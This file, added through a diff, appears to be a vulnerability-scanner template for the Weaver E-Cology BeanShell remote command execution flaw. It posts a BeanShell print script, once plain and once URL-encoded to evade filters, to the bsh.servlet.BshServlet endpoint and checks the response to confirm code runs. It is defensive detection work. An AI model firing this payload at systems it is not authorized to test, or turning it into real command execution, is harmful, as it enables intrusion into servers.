@@ -1,0 +1,40 @@
+id: weaver-ecology-bshservlet-rce
+brief:
+    title: Weaver E-Cology BeanShell - Remote Command Execution
+    by: SleepingBag945
+    level: critical
+    about: Weaver BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.
+    label:
+        - beanshell
+        - rce
+        - weaver
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/weaver/bsh.servlet.BshServlet'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: bsh.script=print%28%22{{randstr}}%22%29%3B
+      signs:
+        - "on": word
+          has:
+            - BeanShell Test Servlet
+          in: body
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/weaver/bsh.servlet.BshServlet'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: '%62%73%68%2e%73%63%72%69%70%74=%70%72%69%6e%74%28%22{{randstr}}%22%29%3b'
+      signs:
+        - "on": word
+          has:
+            - BeanShell Test Servlet
+          in: body
+        - "on": status
+          status:
+            - 200
